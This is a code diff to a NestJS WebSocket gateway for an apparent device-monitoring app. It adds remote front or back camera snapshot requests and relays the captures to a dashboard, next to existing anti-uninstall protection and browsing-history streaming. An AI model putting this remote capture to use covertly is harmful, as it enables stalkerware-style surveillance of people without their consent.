@@ -140,6 +140,16 @@ export class GuardianGateway
     return { event: 'app_shown', deviceId: data.deviceId };
   }
 
+  @SubscribeMessage('camera:request')
+  handleCameraRequest(
+    @MessageBody() data: { deviceId: string; cameraType: 'FRONT' | 'BACK' },
+  ) {
+    const cameraType = data.cameraType || 'BACK';
+    this.logger.log(`Camera snapshot requested for device ${data.deviceId} (${cameraType})`);
+    this.server.to(`device:${data.deviceId}`).emit('camera:capture', { cameraType });
+    return { event: 'camera_requested', deviceId: data.deviceId, cameraType };
+  }
+
   @SubscribeMessage('set_protection')
   handleSetProtection(@MessageBody() data: { deviceId: string; enabled: boolean }) {
     this.logger.log(`Setting anti-uninstall protection for device ${data.deviceId} -> ${data.enabled}`);
@@ -193,6 +203,14 @@ export class GuardianGateway
     this.server.to('dashboard').emit('browsing:new', {
       deviceId: payload.deviceId,
       browsing: payload.data,
+    });
+  }
+
+  @OnEvent('capture.created')
+  handleCaptureCreated(payload: { deviceId: string; data: any }) {
+    this.server.to('dashboard').emit('capture:new', {
+      deviceId: payload.deviceId,
+      capture: payload.data,
     });
   }
 
